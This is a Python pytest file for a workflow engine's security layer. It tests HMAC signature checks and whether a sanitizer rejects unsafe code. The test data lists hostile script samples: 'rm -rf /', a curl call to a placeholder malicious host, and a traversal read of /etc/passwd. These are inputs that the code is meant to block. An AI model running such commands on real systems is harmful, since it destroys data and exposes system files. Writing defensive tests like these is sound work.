import pytest
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine

from auraflow.core.database import Base
from auraflow.core.engine import WorkflowEngine
from auraflow.core.security import SecuritySanitizer, SecurityValidationError
from auraflow.schemas.workflow import TaskNode, TaskType, WorkflowDefinition


def test_hmac_payload_signature_verification():
    secret = "production-cluster-secret-key-99"
    payload = b'{"task_id": "step_1", "action": "run"}'

    signature = SecuritySanitizer.sign_payload(secret, payload)
    assert SecuritySanitizer.verify_signature(secret, payload, signature) is True

    # Tampered payload must fail verification
    tampered_payload = b'{"task_id": "step_1", "action": "delete"}'
    assert SecuritySanitizer.verify_signature(secret, tampered_payload, signature) is False


def test_rejects_malicious_code_patterns():
    malicious_scripts = [
        "import os\nos.system('rm -rf /')",
        "__import__('os').system('curl http://malicious.com')",
        "import subprocess\nsubprocess.Popen(['ls', '-la'])",
        "with open('../../../etc/passwd', 'r') as f: print(f.read())",
    ]

    for script in malicious_scripts:
        with pytest.raises(SecurityValidationError):
            SecuritySanitizer.validate_code_safety(script)


@pytest.fixture
async def async_test_session():
    engine = create_async_engine("sqlite+aiosqlite:///:memory:", echo=False)
    session_factory = async_sessionmaker(engine, expire_on_commit=False, class_=AsyncSession)

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    async with session_factory() as session:
        yield session

    await engine.dispose()


@pytest.mark.asyncio
async def test_engine_blocks_unsafe_workflow_submission(async_test_session: AsyncSession):
    bad_definition = WorkflowDefinition(
        workflow_id="wf_exploit_attempt",
        tasks=[
            TaskNode(
                id="exploit_task",
                type=TaskType.SANDBOX_EXEC,
                params={"code": "os.system('id')"},
            )
        ],
    )

    engine = WorkflowEngine(async_test_session)
    with pytest.raises(SecurityValidationError) as exc:
        await engine.submit_workflow(bad_definition)

    assert "disallowed pattern" in str(exc.value)
